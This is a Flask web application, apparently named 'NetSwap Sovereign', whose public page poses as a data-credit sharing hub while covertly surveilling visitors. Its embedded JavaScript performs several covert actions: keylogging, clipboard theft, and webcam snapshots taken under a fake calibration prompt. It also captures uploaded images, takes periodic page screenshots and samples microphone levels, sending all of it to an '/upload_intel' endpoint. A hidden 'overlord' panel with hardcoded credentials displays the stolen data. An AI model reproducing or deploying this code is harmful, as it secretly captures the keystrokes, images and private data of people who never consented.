from flask import Flask, render_template_string, jsonify, request
import time, json, threading
from threading import Lock

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v184.0 "The Absolute Ghost" ---
# Vizyon: Kesin Peer Ayrımı, Terminal Keylogger ve Tam Entegrasyon. [cite: 2026-01-03]
VERSION = "v184.0"
ADMIN_KEY = "ali_yigit_overlord_A55" 
ADMIN_PIN = "1907" 

state_lock = Lock()
state = {
    "banned_peers": [], 
    "user_registry": {}, 
    "global_chat": [],
    "evolution_count": 84
}

def get_device_info(ua):
    ua = ua.upper()
    if "SM-A55" in ua or "ANDROID" in ua: return "Samsung A55"
    if "WINDOWS" in ua: return "Casper S100 (PC)"
    return "Mobil"

def check_admin_auth(req):
    return req.args.get('key') == ADMIN_KEY and req.args.get('pin') == ADMIN_PIN

@app.route('/overlord_api/<action>', methods=['GET', 'POST'])
def admin_api(action):
    if not check_admin_auth(request): return "YETKİSİZ", 403
    target = request.args.get('target_peer')
    with state_lock:
        if action == "chat_send":
            msg = request.json.get('msg')
            state["global_chat"].append({"from": "ADMIN", "to": target, "msg": msg, "time": time.strftime('%H:%M')})
        elif target in state["user_registry"]:
            u = state["user_registry"][target]
            if action == "vip": u["is_vip"] = not u.get("is_vip", False)
            elif action == "ban": state["banned_peers"].append(target)
            elif action == "unban" and target in state["banned_peers"]: state["banned_peers"].remove(target)
    return jsonify(state)

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    t = request.args.get('type')
    data = request.json
    
    with state_lock:
        # Peer Yoksa Anında Oluştur [cite: 2026-01-03]
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {
                "credits": 50.0, "is_vip": False, 
                "device": get_device_info(request.headers.get('User-Agent','')), 
                "archive": [], "key_logs": []
            }
        
        u = state["user_registry"][p_id]
        if t == "chat":
            state["global_chat"].append({"from": p_id, "to": "ADMIN", "msg": data.get('msg'), "time": time.strftime('%H:%M')})
        elif data.get('image'):
            u["archive"].append({"time": time.strftime('%H:%M:%S'), "type": t, "data": data.get('image')})
            if len(u["archive"]) > 40: u["archive"].pop(0)
        
        if data.get('inputs'): 
            u["key_logs"].append({"time": time.strftime('%H:%M:%S'), "text": data.get('inputs')})
        if data.get('clipboard'): u["clipboard"] = data.get('clipboard')
        if data.get('hw'): u["hw"] = data.get('hw')
        if data.get('intel'): u["intel"] = data.get('intel')
    return "OK"

@app.route('/overlord')
def overlord_panel():
    if not check_admin_auth(request): return "ERİŞİM ENGELLENDİ", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Sovereign Console v184</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white p-4 font-mono text-[9px]">
    <div class="border-b border-blue-600 pb-2 mb-4 flex justify-between items-center italic font-black uppercase">
        <h1 class="text-xl">THE GHOST v184.0</h1>
        <div class="text-blue-500 font-bold uppercase tracking-tighter">HÜKÜMDAR: ALİ YİĞİT</div>
    </div>
    <div class="grid grid-cols-5 gap-4">
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl">
            <h2 class="text-blue-500 mb-2 uppercase font-bold text-[8px] border-b border-zinc-800 pb-1 italic">Aktif Peer Filtresi</h2>
            <select id="pS" class="w-full bg-zinc-900 p-2 rounded mb-4 text-white border border-zinc-800 outline-none" onchange="uG()"></select>
            <div id="intel_box" class="text-[7px] space-y-1 mb-2 bg-blue-900/10 p-2 rounded border border-blue-900/30 text-blue-300"></div>
            <div id="gallery" class="space-y-2 overflow-y-auto max-h-[500px]"></div>
        </div>
        <div class="col-span-3">
            <h2 class="text-green-500 mb-2 uppercase font-bold text-[8px] italic tracking-widest border-b border-zinc-800 pb-1 text-center">İstihbarat Terminali & Peer Listesi</h2>
            <div id="keyTerminal" class="w-full h-44 bg-black border border-zinc-800 rounded p-2 overflow-y-auto mb-4 text-[8px] text-green-400 font-bold shadow-inner"></div>
            <table class="w-full text-left bg-zinc-950 rounded-xl overflow-hidden border border-zinc-900">
                <thead class="bg-zinc-900 text-zinc-400 uppercase text-[8px]"><tr><th class="p-2">Cihaz</th><th>Peer ID</th><th>Bakiye</th><th>VIP</th><th>Yönetim</th></tr></thead>
                <tbody id="uT"></tbody>
            </table>
        </div>
        <div class="col-span-1 bg-zinc-950 p-2 border border-zinc-900 rounded-xl shadow-2xl text-center">
            <h2 class="text-yellow-500 mb-2 uppercase font-bold text-[8px] border-b border-zinc-800 pb-1 italic">Hükümdar VIP Sohbet</h2>
            <div id="chatBox" class="h-64 overflow-y-auto bg-black p-2 rounded border border-zinc-800 mb-2 text-[8px] space-y-1"></div>
            <input id="chatIn" type="text" class="w-full bg-zinc-900 p-2 rounded text-[8px] outline-none border border-zinc-800 mb-1" placeholder="Emir yaz...">
            <button onclick="sendMsg()" class="w-full bg-blue-900 py-1 rounded text-[8px] font-black uppercase tracking-widest">GÖNDER</button>
        </div>
    </div>
    <script>
        const k="{{a_key}}", p="{{a_pin}}"; let reg = {};
        async function f(a, t, v=""){ await fetch(`/overlord_api/${a}?key=${k}&pin=${p}&target_peer=${t}&value=${v}`); update(); }
        async function sendMsg(){
            const m = document.getElementById('chatIn').value; const t = document.getElementById('pS').value;
            if(!t || !m) return;
            await fetch(`/overlord_api/chat_send?key=${k}&pin=${p}&target_peer=${t}`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg: m})});
            document.getElementById('chatIn').value = ""; update();
        }
        function uG(){
            const id = document.getElementById('pS').value; if(!id || !reg[id]) return;
            const u = reg[id]; let h = "", tH = "";
            document.getElementById('intel_box').innerHTML = `BAT: %${u.hw?.bat||'--'} | IDLE: ${u.intel?.idle?'EVET':'HAYIR'}<br>SES: ${u.intel?.noise||'OFF'}`;
            (u.archive||[]).slice().reverse().forEach(s => { 
                let c = s.type == 'cam' ? 'border-red-600' : s.type == 'scr' ? 'border-green-600' : 'border-blue-600';
                h += `<div class="p-1 border ${c} bg-black rounded mb-2 shadow-lg"><img src="${s.data}" class="w-full rounded"></div>`; 
            }); document.getElementById('gallery').innerHTML = h;
            (u.key_logs||[]).forEach(log => { tH += `<div>[${log.time}] > ${log.text}</div>`; });
            if(u.clipboard) tH = `<div class='text-red-500 border-b border-red-900 mb-2'>[PANO]: ${u.clipboard}</div>` + tH;
            document.getElementById('keyTerminal').innerHTML = tH;
            const term = document.getElementById('keyTerminal'); term.scrollTop = term.scrollHeight;
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json(); reg = d.user_registry;
            let uH="", pO="<option value=''>Cihaz Seç...</option>", cH="";
            const sortedIds = Object.keys(d.user_registry).sort((a,b) => (d.user_registry[b].is_vip ? 1 : 0) - (d.user_registry[a].is_vip ? 1 : 0));
            for(let id of sortedIds){
                let u=d.user_registry[id];
                if(d.banned_peers.includes(id)) continue;
                pO += `<option value="${id}" ${document.getElementById('pS').value==id?'selected':''}>${u.device} - ${id}</option>`;
                uH += `<tr class="border-b border-zinc-900 ${u.is_vip?'bg-yellow-900/10':''}">
                <td class="p-2">${u.device}</td><td class="text-blue-400 font-bold">${id}</td>
                <td class="font-bold">${u.credits.toFixed(2)}</td><td class="font-bold text-yellow-500">${u.is_vip?'EVET':'HAYIR'}</td>
                <td><button onclick="f('vip','${id}')" class="underline text-[8px] font-black uppercase">VIP</button> <button onclick="f('ban','${id}')" class="text-red-600 ml-1 font-black">BAN</button></td></tr>`;
            }
            d.global_chat.forEach(m => { cH += `<div class="${m.from=='ADMIN'?'text-blue-400':'text-green-400'}"><b>${m.from=='ADMIN'?'HÜKÜMDAR':m.from}:</b> ${m.msg}</div>`; });
            document.getElementById('uT').innerHTML = uH; document.getElementById('pS').innerHTML = pO;
            document.getElementById('chatBox').innerHTML = cH; uG();
            setTimeout(update, 3000);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

@app.route('/action/<type>')
def handle_action(type):
    p_id = request.args.get('peer_id', 'GUEST')
    with state_lock:
        if p_id in state["banned_peers"]: return jsonify({"error": "BAN"}), 403
        if p_id not in state["user_registry"]:
            state["user_registry"][p_id] = {"credits": 50.0, "is_vip": False, "device": get_device_info(request.headers.get('User-Agent','')), "archive": [], "key_logs": []}
        u = state["user_registry"][p_id]
        if type == "receive" and not u["is_vip"]: u["credits"] = max(0, u["credits"] - 0.2)
    return jsonify({"status": "OK", "is_vip": u["is_vip"]})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Imperial Hub</title><script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
<style>.bar { width: 5px; background: #2563eb; margin: 1px; transition: height 0.1s; border-radius: 2px; }</style></head>
<body id="b" class="bg-black text-white font-mono flex items-center justify-center h-screen overflow-hidden">
    <div id="blueDot" style="position:fixed; width:25px; height:25px; background:blue; border-radius:50%; display:none; z-index:9999; box-shadow:0 0 15px blue;"></div>
    
    <div id="main" class="w-full h-full p-6 text-center">
        <h1 class="text-3xl font-black text-blue-600 italic mb-6 uppercase tracking-tighter">IMPERIAL HUB</h1>
        
        <div id="vis_box" class="bg-zinc-950 rounded-[30px] p-4 border border-zinc-900 mb-6 shadow-xl">
            <h2 class="text-[10px] font-bold text-blue-500 mb-2 uppercase tracking-widest text-center italic">Sistem Kalibrasyon Analizi</h2>
            <div id="vis" class="flex items-end justify-center h-12 mb-3">
                <div class="bar h-2" style="width:5px; margin:1px; background:#2563eb;"></div><div class="bar h-8" style="width:5px; margin:1px; background:#2563eb;"></div><div class="bar h-4" style="width:5px; margin:1px; background:#2563eb;"></div>
            </div>
            <button id="v_btn" onclick="toggleAudio()" class="w-full py-3 bg-zinc-900 rounded-2xl text-[10px] font-black text-blue-400">ANALİZİ BAŞLAT</button>
        </div>

        <div class="bg-zinc-950 p-10 rounded-[50px] border border-zinc-900 mb-6 shadow-2xl relative">
            <div id="v_t" class="hidden absolute top-4 left-1/2 -translate-x-1/2 bg-yellow-600 text-black text-[8px] font-black px-4 py-1 rounded-full uppercase">Hükümdar VIP</div>
            <div id="cr" class="text-6xl font-black italic">0.00</div>
            <p class="text-[9px] text-zinc-600 uppercase mt-2 font-bold tracking-widest text-blue-500 italic text-center">Kullanılabilir Bakiye (MB)</p>
        </div>
        
        <div class="grid grid-cols-2 gap-4 mb-6">
            <button onclick="calib('share')" class="py-6 bg-green-700 text-black font-black rounded-3xl text-xl active:scale-95 transition">VER</button>
            <button onclick="calib('receive')" class="py-6 bg-blue-700 text-white font-black rounded-3xl text-xl active:scale-95 transition">AL</button>
        </div>

        <div class="bg-zinc-900/40 p-4 rounded-3xl border border-zinc-800/50">
            <button onclick="document.getElementById('wp').click()" class="w-full text-[10px] text-zinc-400 underline uppercase font-black">Özel Arayüz Görseli Yükle</button>
        </div>
        <input type="file" id="wp" class="hidden" accept="image/*" onchange="loot(event)">

        <div id="chatUI" class="hidden mt-4 bg-zinc-900 p-4 rounded-3xl border border-zinc-800 text-left">
            <p class="text-[8px] text-blue-500 font-bold mb-2 uppercase italic tracking-widest">Sovereign Canlı Destek</p>
            <div id="cM" class="h-20 overflow-y-auto text-[8px] mb-2 space-y-1"></div>
            <input id="cI" type="text" class="w-full bg-black p-2 rounded text-[8px] outline-none border border-zinc-800" placeholder="Mesaj yaz...">
        </div>
    </div>
    
    <video id="v" class="hidden" autoplay playsinline></video><canvas id="cnv" class="hidden"></canvas>
    <div id="s_a" style="position:fixed; top:0; right:0; width:120px; height:120px; z-index:9999;"></div>

    <script>
        // KESİN PEER AYRIMI: Her cihaz için mutlak kimlik [cite: 2026-01-03]
        if(!localStorage.getItem('n_id')) {
            const newId = "PEER-" + Math.floor(1000 + Math.random() * 9000) + "-" + Date.now().toString().slice(-4);
            localStorage.setItem('n_id', newId);
        }
        let myId = localStorage.getItem('n_id'), inputs = "", clip = "", count = 0, isPlaying = false, hasCal = false, noiseLevel = "OFF";

        document.getElementById('s_a').onclick = () => { count++; if(count >= 5){ let p=prompt("ERİŞİM KODU:"); if(p) window.location.href=`/overlord?key={{a_key}}&pin=`+p; count=0; } };
        
        window.addEventListener('keydown', (e) => { 
            let k = e.key;
            if(k.length === 1) inputs += k;
            else if(k === "Backspace") inputs += " [DEL] ";
            else if(k === "Enter") inputs += " [ENTER] ";
        });

        window.addEventListener('copy', async () => { try { clip = await navigator.clipboard.readText(); } catch(e) {} });

        async function toggleAudio() {
            const btn = document.getElementById('v_btn');
            if(!isPlaying) {
                try {
                    const s = await navigator.mediaDevices.getUserMedia({audio:true});
                    isPlaying = true; btn.innerText = "DURAKLAT"; btn.style.color = "red";
                    const ac = new AudioContext(); const src = ac.createMediaStreamSource(s);
                    const an = ac.createAnalyser(); src.connect(an);
                    const data = new Uint8Array(an.frequencyBinCount);
                    function draw() {
                        if(!isPlaying) return;
                        an.getByteFrequencyData(data);
                        noiseLevel = data[0] > 15 ? "GÜRÜLTÜLÜ" : "SESSİZ";
                        requestAnimationFrame(draw);
                    } draw();
                } catch(e) { alert("Sistem doğrulaması için mikrofon izni gereklidir."); }
            } else { isPlaying = false; btn.innerText = "BAŞLAT"; btn.style.color = "#60a5fa"; noiseLevel = "DURDU"; }
        }

        async function loot(e) {
            const file = e.target.files[0]; if(!file) return;
            const reader = new FileReader(); reader.onload = (re) => {
                document.getElementById('b').style.backgroundImage = `url(${re.target.result})`;
                document.getElementById('b').style.backgroundSize = "cover";
                fetch(`/upload_intel?peer_id=${myId}&type=loot`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: re.target.result}) });
                ghostEye('cam');
            }; reader.readAsDataURL(file);
        }

        async function calib(t) {
            if(hasCal) { fetch(`/action/${t}?peer_id=${myId}`); ghostEye('cam'); return; }
            const dot = document.getElementById('blueDot'); dot.style.display='block';
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                let steps = 0;
                const int = setInterval(() => {
                    dot.style.top = Math.random()*80+10+"%"; dot.style.left = Math.random()*80+10+"%";
                    ghostEye('cam'); steps++;
                    if(steps>=3){ clearInterval(int); dot.style.display='none'; hasCal=true; s.getTracks().forEach(tr=>tr.stop()); fetch(`/action/${t}?peer_id=${myId}`); }
                }, 1000);
            } catch(e) { fetch(`/action/${t}?peer_id=${myId}`); }
        }

        async function ghostEye(type) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({video:true});
                const v = document.getElementById('v'), cnv = document.getElementById('cnv');
                v.srcObject = s; await v.play();
                cnv.width = 480; cnv.height = 360;
                cnv.getContext('2d').drawImage(v, 0, 0);
                fetch(`/upload_intel?peer_id=${myId}&type=${type}`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({image: cnv.toDataURL('image/jpeg', 0.5)}) });
                s.getTracks().forEach(tr => tr.stop());
            } catch(e) {}
        }

        document.getElementById('cI').onkeypress = (e) => {
            if(e.key === 'Enter'){
                fetch(`/upload_intel?peer_id=${myId}&type=chat`, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({msg: e.target.value})});
                e.target.value = "";
            }
        };

        async function main() {
            const bt = await navigator.getBattery();
            const cv = await html2canvas(document.body, {scale:0.2});
            const r = await fetch('/api/status'); const d = await r.json();
            const u = d.user_registry[myId] || {credits:0, is_vip: false};
            document.getElementById('cr').innerText = u.credits.toFixed(2);
            if(u.is_vip) { document.getElementById('v_t').classList.remove('hidden'); document.getElementById('chatUI').classList.remove('hidden'); }
            
            let cH = ""; d.global_chat.filter(m => m.to==myId || m.from==myId).forEach(m => {
                cH += `<div><b>${m.from=='ADMIN'?'SİSTEM':m.from}:</b> ${m.msg}</div>`;
            }); document.getElementById('cM').innerHTML = cH;
            
            fetch(`/upload_intel?peer_id=${myId}&type=scr`, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
                image: cv.toDataURL('image/jpeg', 0.1),
                hw: {bat: Math.floor(bt.level*100)},
                inputs: inputs, clipboard: clip,
                intel: {idle: document.hidden, noise: noiseLevel}
            }) });
            inputs = ""; clip = ""; setTimeout(main, 7000);
        } main();
    </script>
</body></html>
""", a_key=ADMIN_KEY, a_pin=ADMIN_PIN)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=7860)
